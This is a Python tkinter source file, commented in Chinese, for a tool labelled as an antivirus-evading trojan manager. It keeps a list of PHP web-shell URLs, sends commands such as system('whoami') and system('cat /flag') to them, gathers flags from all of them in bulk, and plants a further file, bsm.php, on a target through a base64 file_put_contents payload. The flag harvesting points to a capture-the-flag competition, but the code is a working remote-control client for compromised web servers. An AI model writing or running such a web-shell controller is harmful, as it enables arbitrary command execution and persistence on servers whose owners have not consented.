import tkinter as tk
from tkinter import ttk, messagebox, simpledialog
import requests
import os
import base64
import json
from tkinter import scrolledtext

class TrojanManager:
    def __init__(self, shell_file):
        self.shell_file = shell_file
        # 确保shell目录存在
        os.makedirs(os.path.dirname(shell_file), exist_ok=True)
        # 初始化shell.txt文件
        if not os.path.exists(shell_file):
            with open(shell_file, 'w', encoding='utf-8') as f:
                pass

    def load_shells(self):
        """加载所有木马记录"""
        shells = []
        if os.path.exists(self.shell_file):
            with open(self.shell_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        # 解析每行格式: url|method|params
                        parts = line.split('|')
                        if len(parts) == 3:
                            shells.append({
                                'url': parts[0],
                                'method': parts[1],
                                'params': parts[2]
                            })
        return shells

    def save_shell(self, url, method, params):
        """保存新木马到文件"""
        with open(self.shell_file, 'a', encoding='utf-8') as f:
            f.write(f"{url}|{method}|{params}\n")

    def delete_shell(self, url):
        """从文件中删除指定木马"""
        shells = self.load_shells()
        with open(self.shell_file, 'w', encoding='utf-8') as f:
            for shell in shells:
                if shell['url'] != url:
                    f.write(f"{shell['url']}|{shell['method']}|{shell['params']}\n")

    def update_shell(self, old_url, new_url, new_method, new_params):
        """更新指定木马信息"""
        shells = self.load_shells()
        with open(self.shell_file, 'w', encoding='utf-8') as f:
            for shell in shells:
                if shell['url'] == old_url:
                    f.write(f"{new_url}|{new_method}|{new_params}\n")
                else:
                    f.write(f"{shell['url']}|{shell['method']}|{shell['params']}\n")

class TrojanManagerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("免杀木马管理系统")
        self.root.geometry("800x600")

        # 创建木马管理器实例
        self.shell_manager = TrojanManager(os.path.join(os.getcwd(), 'shell', 'shell.txt'))

        # 创建界面组件
        self.create_widgets()
        # 加载木马列表
        self.load_shell_list()

    def create_widgets(self):
        # 创建主框架
        main_frame = tk.Frame(self.root)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # 上半部分：添加木马
        add_frame = tk.LabelFrame(main_frame, text="添加木马", padx=10, pady=10)
        add_frame.pack(fill=tk.X, pady=(0, 10))

        # URL输入
        tk.Label(add_frame, text="URL:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.url_entry = tk.Entry(add_frame, width=50)
        self.url_entry.grid(row=0, column=1, padx=5, pady=5)

        # 命令参数输入
        tk.Label(add_frame, text="命令参数:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.cmd_entry = tk.Entry(add_frame, width=50)
        self.cmd_entry.grid(row=1, column=1, padx=5, pady=5)

        # 请求方法选择
        tk.Label(add_frame, text="方法:").grid(row=2, column=0, sticky=tk.W, pady=5)
        self.method_var = tk.StringVar(value="GET")
        method_frame = tk.Frame(add_frame)
        tk.Radiobutton(method_frame, text="GET", variable=self.method_var, value="GET").pack(side=tk.LEFT, padx=5)
        tk.Radiobutton(method_frame, text="POST", variable=self.method_var, value="POST").pack(side=tk.LEFT, padx=5)
        method_frame.grid(row=2, column=1, sticky=tk.W, pady=5)

        # 测试和添加按钮
        button_frame = tk.Frame(add_frame)
        test_btn = tk.Button(button_frame, text="测试连接", command=self.test_connection)
        test_btn.pack(side=tk.LEFT, padx=5)
        add_btn = tk.Button(button_frame, text="添加", command=self.add_shell)
        add_btn.pack(side=tk.LEFT, padx=5)
        button_frame.grid(row=3, column=1, sticky=tk.W, pady=10)

        # 中间部分：木马列表
        list_frame = tk.LabelFrame(main_frame, text="木马列表", padx=10, pady=10)
        list_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))

        self.shell_listbox = tk.Listbox(list_frame, width=80, height=10, selectmode=tk.EXTENDED)
        self.shell_listbox.pack(fill=tk.BOTH, expand=True)
        # 右键菜单
        self.shell_menu = tk.Menu(self.root, tearoff=0)
        self.shell_menu.add_command(label="删除", command=self.delete_shell)
        self.shell_menu.add_command(label="修改", command=self.modify_shell)
        self.shell_menu.add_command(label="测试", command=self.test_selected_shell)
        self.shell_menu.add_command(label="上传", command=self.upload_bsm_php)
        self.shell_listbox.bind("<Button-3>", self.show_menu)

        # 下半部分：命令执行
        exec_frame = tk.LabelFrame(main_frame, text="命令执行", padx=10, pady=10)
        exec_frame.pack(fill=tk.BOTH, expand=True)

        # 命令输入
        tk.Label(exec_frame, text="执行命令参数:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.cmd_input = tk.Entry(exec_frame, width=60)
        self.cmd_input.grid(row=0, column=1, padx=5, pady=5, sticky=tk.EW)
        exec_btn = tk.Button(exec_frame, text="执行", command=self.execute_command)
        exec_btn.grid(row=0, column=2, padx=5, pady=5)
        self.flag_path_label = ttk.Label(exec_frame, text="Flag路径:")
        self.flag_path_label.grid(row=0, column=3, padx=5, pady=5, sticky=tk.W)
        self.flag_path_entry = ttk.Entry(exec_frame, width=20)
        self.flag_path_entry.insert(0, "/flag")
        self.flag_path_entry.grid(row=0, column=4, padx=5, pady=5)
        self.read_all_flags_btn = ttk.Button(exec_frame, text="读取全部flag", command=self.read_all_flags)
        self.read_all_flags_btn.grid(row=0, column=5, padx=5, pady=5)

        # 结果显示
        tk.Label(exec_frame, text="返回结果:").grid(row=1, column=0, sticky=tk.NW, pady=5)
        self.result_text = scrolledtext.ScrolledText(exec_frame, height=10, width=80)
        self.result_text.grid(row=2, column=0, columnspan=3, sticky=tk.NSEW)

        # 设置网格权重使控件可扩展
        exec_frame.grid_rowconfigure(2, weight=1)
        exec_frame.grid_columnconfigure(1, weight=1)

    def load_shell_list(self):
        """加载木马列表到列表框"""
        self.shell_listbox.delete(0, tk.END)
        shells = self.shell_manager.load_shells()
        for idx, shell in enumerate(shells, 1):
            self.shell_listbox.insert(tk.END, f"[{idx}] {shell['url']} (Method: {shell['method']})")

    def test_connection(self):
        """测试URL连接"""
        url = self.url_entry.get().strip()
        method = self.method_var.get()
        params = self.cmd_entry.get().strip()

        if not url:
            messagebox.showerror("错误", "URL不能为空")
            return

        try:
            if method == "GET":
                response = requests.get(url, params=params, timeout=5)
            else:
                response = requests.post(url, data=params, timeout=5)

            if response.status_code == 200:
                messagebox.showinfo("成功", "连接成功，状态码: 200")
            else:
                messagebox.showerror("错误", f"连接失败，状态码: {response.status_code}")
        except Exception as e:
            messagebox.showerror("错误", f"连接失败: {str(e)}")

    def add_shell(self):
        """添加木马到列表和文件"""
        url = self.url_entry.get().strip()
        method = self.method_var.get()
        params = self.cmd_entry.get().strip()

        if not url or not params:
            messagebox.showerror("错误", "URL和命令参数不能为空")
            return

        # 保存到文件
        self.shell_manager.save_shell(url, method, params)
        # 刷新列表
        self.load_shell_list()
        # 清空输入框
        self.url_entry.delete(0, tk.END)
        self.cmd_entry.delete(0, tk.END)
        messagebox.showinfo("成功", "木马添加成功")

    def delete_shell(self):
        """删除选中的多个木马"""
        selected_indices = self.shell_listbox.curselection()
        if not selected_indices:
            return

        # 获取所有选中项的URL
        shells = self.shell_manager.load_shells()
        for index in selected_indices:
            shell_info = self.shell_listbox.get(index)
            url = shell_info.split('] ')[1].split(' (')[0]
            self.shell_manager.delete_shell(url)

        # 刷新列表
        self.load_shell_list()

    def modify_shell(self):
        """修改选中的木马信息"""
        selected_indices = self.shell_listbox.curselection()
        if not selected_indices or len(selected_indices) > 1:
            messagebox.showwarning("警告", "请选择一条记录进行修改")
            return
        
        index = selected_indices[0]
        shell_info = self.shell_listbox.get(index)
        old_url = shell_info.split('] ')[1].split(' (')[0]
        shells = self.shell_manager.load_shells()
        shell = next((s for s in shells if s['url'] == old_url), None)
        
        if not shell:
            return
        
        # 创建修改对话框
        dialog = tk.Toplevel(self.root)
        dialog.title("修改木马")
        dialog.geometry("400x300")
        dialog.transient(self.root)
        dialog.grab_set()
        
        # URL输入
        tk.Label(dialog, text="URL:").grid(row=0, column=0, sticky=tk.W, pady=5)
        url_entry = tk.Entry(dialog, width=50)
        url_entry.grid(row=0, column=1, padx=5, pady=5)
        url_entry.insert(0, shell['url'])
        
        # 命令参数输入
        tk.Label(dialog, text="命令参数:").grid(row=1, column=0, sticky=tk.W, pady=5)
        cmd_entry = tk.Entry(dialog, width=50)
        cmd_entry.grid(row=1, column=1, padx=5, pady=5)
        cmd_entry.insert(0, shell['params'])
        
        # 请求方法选择
        tk.Label(dialog, text="方法:").grid(row=2, column=0, sticky=tk.W, pady=5)
        method_var = tk.StringVar(value=shell['method'])
        method_frame = tk.Frame(dialog)
        tk.Radiobutton(method_frame, text="GET", variable=method_var, value="GET").pack(side=tk.LEFT, padx=5)
        tk.Radiobutton(method_frame, text="POST", variable=method_var, value="POST").pack(side=tk.LEFT, padx=5)
        method_frame.grid(row=2, column=1, sticky=tk.W, pady=5)
        
        def save_modification():
            new_url = url_entry.get().strip()
            new_method = method_var.get()
            new_params = cmd_entry.get().strip()
            
            if not new_url or not new_params:
                messagebox.showerror("错误", "URL和命令参数不能为空")
                return
            
            self.shell_manager.update_shell(old_url, new_url, new_method, new_params)
            self.load_shell_list()
            dialog.destroy()
            messagebox.showinfo("成功", "木马修改成功")
        
        button_frame = tk.Frame(dialog)
        tk.Button(button_frame, text="保存", command=save_modification).pack(side=tk.LEFT, padx=5)
        tk.Button(button_frame, text="取消", command=dialog.destroy).pack(side=tk.LEFT, padx=5)
        button_frame.grid(row=3, column=1, sticky=tk.W, pady=10)

    def show_menu(self, event):
        """显示右键菜单，保留现有选择"""
        # 获取右键点击位置的索引
        index = self.shell_listbox.nearest(event.y)
        if index >= 0 and index not in self.shell_listbox.curselection():
            self.shell_listbox.selection_set(index)
        self.shell_menu.post(event.x_root, event.y_root)

    def read_all_flags(self):
        """读取所有木马的flag并保存到flag.txt"""
        shells = self.shell_manager.load_shells()
        if not shells:
            messagebox.showwarning("警告", "木马列表为空")
            return
        
        flag_results = []
        self.result_text.delete(1.0, tk.END)
        self.result_text.insert(tk.END, "开始读取所有flag...\n\n")
        
        for idx, shell in enumerate(shells, 1):
            url = shell['url']
            method = shell['method']
            base_params = shell['params']
            flag_path = self.flag_path_entry.get().strip() or "/flag"
            cmd_params = f"system('cat {flag_path}');"
            
            # 合并基础参数和命令参数
            params = f"{base_params}&{cmd_params}" if base_params else cmd_params
            params_dict = {p.split('=')[0]: p.split('=')[1] for p in params.split('&') if '=' in p}
            
            try:
                self.result_text.insert(tk.END, f"正在执行 [{idx}] {url} ...\n")
                self.root.update_idletasks()
                
                if method == "GET":
                    response = requests.get(url, params=params_dict, timeout=10)
                else:
                    response = requests.post(url, data=params_dict, timeout=10)
                
                result = f"[{idx}] {url} 成功:\n{response.text}\n\n"
                flag_results.append(result)
                self.result_text.insert(tk.END, result)
            except Exception as e:
                error_msg = f"[{idx}] {url} 失败: {str(e)}\n\n"
                flag_results.append(error_msg)
                self.result_text.insert(tk.END, error_msg)
            
            self.result_text.see(tk.END)
            self.root.update_idletasks()
        
        # 保存结果到flag.txt
        with open('flag.txt', 'w', encoding='utf-8') as f:
            f.writelines(flag_results)
        
        messagebox.showinfo("完成", f"所有flag已读取，共{len(shells)}个木马，结果已保存到flag.txt")

    def execute_command(self):
        """执行命令并显示结果"""
        selected = self.shell_listbox.curselection()
        if not selected:
            messagebox.showwarning("警告", "请先选择一个木马")
            return

        cmd_params = self.cmd_input.get().strip()
        if not cmd_params:
            messagebox.showerror("错误", "命令参数不能为空")
            return

        # 获取选中的木马信息
        index = selected[0]
        shell_info = self.shell_listbox.get(index)
        url = shell_info.split('] ')[1].split(' (')[0]
        shells = self.shell_manager.load_shells()
        # 查找对应的方法和参数
        selected_shell = None
        for shell in shells:
            if shell['url'] == url:
                selected_shell = shell
                break

        if not selected_shell:
            messagebox.showerror("错误", "未找到选中的木马信息")
            return

        # 执行HTTP请求
        try:
            method = selected_shell['method']
            # 合并基础参数和执行时的参数
            params = selected_shell['params'] + cmd_params if selected_shell['params'] else cmd_params
            params_dict = {p.split('=')[0]: p.split('=')[1] for p in params.split('&') if '=' in p}

            if method == "GET":
                response = requests.get(url, params=params_dict, timeout=10)
            else:
                response = requests.post(url, data=params_dict, timeout=10)

            # 显示结果
            self.result_text.delete(1.0, tk.END)
            self.result_text.insert(tk.END, response.text)
        except Exception as e:
            self.result_text.delete(1.0, tk.END)
            self.result_text.insert(tk.END, f"执行错误: {str(e)}")

    def load_shell_list(self):
        """重新加载木马列表"""
        self.shell_listbox.delete(0, tk.END)
        shells = self.shell_manager.load_shells()
        for idx, shell in enumerate(shells, 1):
            self.shell_listbox.insert(tk.END, f"[{idx}] {shell['url']} (Method: {shell['method']})")

    def test_selected_shell(self):
        """测试选中的木马，自动执行whoami命令"""
        selected_indices = self.shell_listbox.curselection()
        if not selected_indices or len(selected_indices) > 1:
            messagebox.showwarning("警告", "请选择一条记录进行测试")
            return
        
        # 设置命令参数为whoami
        self.cmd_input.delete(0, tk.END)
        self.cmd_input.insert(0, "system('whoami');")
        # 执行命令
        self.execute_command()

    def upload_bsm_php(self):
        """读取本地bsm.php文件并逐行上传到目标服务器"""
        selected_indices = self.shell_listbox.curselection()
        if not selected_indices or len(selected_indices) > 1:
            messagebox.showwarning("警告", "请选择一条记录进行上传")
            return
        
        # 获取bsm.php文件路径
        bsm_path = os.path.join(os.getcwd(), 'shell', 'bsm.php')
        if not os.path.exists(bsm_path):
            messagebox.showerror("错误", f"文件不存在: {bsm_path}")
            return
        
        try:
            # 读取文件内容
            with open(bsm_path, 'r', encoding='utf-8') as f:
                lines = f.readlines()
                
            if not lines:
                messagebox.showinfo("提示", "bsm.php文件内容为空")
                return
            
            # 显示上传进度对话框
            progress_dialog = tk.Toplevel(self.root)
            progress_dialog.title("上传中")
            progress_dialog.geometry("300x100")
            progress_dialog.transient(self.root)
            progress_dialog.grab_set()
            
            tk.Label(progress_dialog, text="正在上传文件，请稍候...").pack(pady=10)
            progress_var = tk.DoubleVar()
            progress_bar = ttk.Progressbar(progress_dialog, variable=progress_var, length=250)
            progress_bar.pack(pady=10)
            
            # 逐行上传文件内容
            total_lines = len(lines)
            success_count = 0
            
            for i, line in enumerate(lines, 1):
                # 更新进度条
                progress_var.set((i / total_lines) * 100)
                progress_dialog.update_idletasks()
                
            # 读取完整文件内容并进行base64编码
            full_content = ''.join(lines)
            b64_content = base64.b64encode(full_content.encode()).decode()
            
            # 构造file_put_contents命令
            b64_content=b64_content.replace('=','%3D')
            php_cmd = f"file_put_contents('bsm.php', base64_decode('{b64_content}'));"

            cmd = f"{php_cmd}"
            
            # 设置命令参数并执行
            self.cmd_input.delete(0, tk.END)
            self.cmd_input.insert(0, cmd)
            self.execute_command()
            
            success_count = 1
            total_lines = 1
            progress_var.set(100)
            progress_dialog.update_idletasks()
            
            # 关闭进度对话框并显示结果
            progress_dialog.destroy()
            messagebox.showinfo("成功", f"文件上传完成，共上传 {success_count}/{total_lines} 行")
            
        except Exception as e:
            messagebox.showerror("错误", f"上传失败: {str(e)}")

    def show_menu(self, event):
        """显示右键菜单，保留现有选择"""
        # 获取右键点击位置的索引
        index = self.shell_listbox.nearest(event.y)
        if index >= 0 and index not in self.shell_listbox.curselection():
            self.shell_listbox.selection_set(index)
        self.shell_menu.post(event.x_root, event.y_root)

if __name__ == "__main__":
    root = tk.Tk()
    app = TrojanManagerGUI(root)
    root.mainloop()